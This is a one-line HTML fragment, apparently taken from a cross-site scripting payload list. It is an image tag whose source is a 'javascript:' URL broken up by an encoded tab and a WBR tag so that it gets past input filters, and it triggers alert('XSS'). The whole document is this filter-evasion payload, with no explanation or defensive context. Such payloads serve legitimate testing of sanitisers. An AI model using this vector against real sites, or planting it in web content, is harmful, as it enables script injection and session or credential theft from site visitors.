&lt;img src="jav&amp;#x09;ascript:alert(&lt;WBR&gt;'XSS');"&gt;